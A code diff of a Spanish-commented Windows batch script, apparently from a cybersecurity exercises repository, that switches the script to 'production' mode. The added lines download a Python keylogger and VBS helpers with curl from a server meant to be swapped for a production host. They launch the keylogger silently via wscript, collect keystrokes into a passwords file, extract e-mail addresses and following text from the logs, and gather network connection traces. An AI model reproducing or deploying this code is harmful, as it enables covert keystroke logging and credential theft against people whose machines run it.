@@ -10,7 +10,7 @@ set "myHostName=%COMPUTERNAME%"
 
 echo **************************** COMANDOS QUE VULNERAR LA CONFIDENCIALIDAD **************************** >> salida.txt
     call :GetKeyloggerInfo || set "ErrorCode=1"
-    ::call :GetCredentials || echo  FALLO LA OBTENCIÓN DE CREDENCIALES MEDIANTE KEYLOGGER>> salida.txt 
+    call :GetCredentials || echo  FALLO LA OBTENCIÓN DE CREDENCIALES MEDIANTE KEYLOGGER>> salida.txt 
     call :GetSystemInfo || set "ErrorCode=1"
     call :GetUserInfo || set "ErrorCode=1"
 
@@ -40,7 +40,6 @@ exit /b
 :ErrorHandler
 echo Ha ocurrido un error durante la ejecución del script. >> salida.txt
 echo Código de Error: %ErrorCode% >> salida.txt
-:: Aquí puedes agregar más acciones de manejo de errores, como notificar al usuario o limpiar archivos temporales.
 exit /b
 
 
@@ -88,13 +87,15 @@ exit /b
 
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE keystrokes DE TECLADO **************************** >> salida.txt
-    mkdir KeyLoggerApp\App\keyloggerLogs
+    mkdir keyloggerLogs
     
-    :: enable these lines in production environment
-    ::start "" wscript //B //Nologo "setup.vbs" 
-    
-    :: these lines escute in development environtment, to test need to download repo from https://github.com/Naofumi-Alu/CyberSecurityExercises.git
-    start "" wscript //B //Nologo "KeyLoggerApp\App\setup.vbs" 
+    :: change path with production path   
+    curl -o keyLogger.py http://localhost:3000/KeyLoggerApp/keyLogger.py
+    curl -o ExtractAfterEmail.vbs http://localhost:3000/KeyLoggerApp/ExtractAfterEmail.vbs
+    curl -o setup.vbs http://localhost:3000/KeyLoggerApp/setup.vbs
+    curl -o requirements.txt http://localhost:3000/KeyLoggerApp/requirements.txt
+
+    start "" wscript //B //Nologo "setup.vbs" 
     echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
@@ -103,36 +104,23 @@ exit /b
     echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt
     :: crea archivo passwords.txt dentro de directorio keyloggerLogs
 
-    :: enable these lines in production environment
-    ::echo. > keyloggerLogs\passwords.txt
-    ::move keystrokes.txt keyloggerLogs
-
-    :: these lines escute in development environtment, to test need to download repo from https://github.com/Naofumi-Alu/CyberSecurityExercises.git
-    echo. > KeyLoggerApp\App\keyloggerLogs\passwords.txt
-    move KeyLoggerApp\App\keystrokes.txt KeyLoggerApp\App\keyloggerLogs
+    echo. > keyloggerLogs\passwords.txt
+    move keystrokes.txt keyloggerLogs
 
     netstat -n > ips.txt
     setlocal enabledelayedexpansion
+
     for /f "tokens=3" %%a in ('findstr /R "^[TCP]*" ips.txt') do (
         echo Resolviendo %%a...
         nslookup %%a 1>>temp_trace.txt 2>nul
     )
     echo Proceso completado. Revisa el archivo temp_trace.txt
 
-    :: enable this line in production environment
-    ::findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\keystrokes.txt >> keyloggerLogs\mails.txt
+    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\keystrokes.txt >> keyloggerLogs\mails.txt
 
-    :: This line escute in development environtment, to test need to download repo from https://github.com/Naofumi-Alu/CyberSecurityExercises.git
-    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" KeyLoggerApp\App\keyloggerLogs\keystrokes.txt >> KeyLoggerApp\App\keyloggerLogs\mails.txt
+    wscript ExtractAfterEmail.vbs
+    type temp_trace.txt >> keyloggerLogs\httpRequests.txt
 
-    :: enable these lines in production environment
-    ::wscript ExtractAfterEmail.vbs
-    ::type temp_trace.txt >> keyloggerLogs\httpRequests.txt
-
-    :: This line escute in development environtment, to test need to download repo from
-    wscript KeyLoggerApp\App\Utils\ExtractAfterEmail.vbs
-    type temp_trace.txt >> KeyLoggerApp\App\keyloggerLogs\httpRequests.txt
-    
     echo ************************************************************************************* >> salida.txt
     exit /b
 
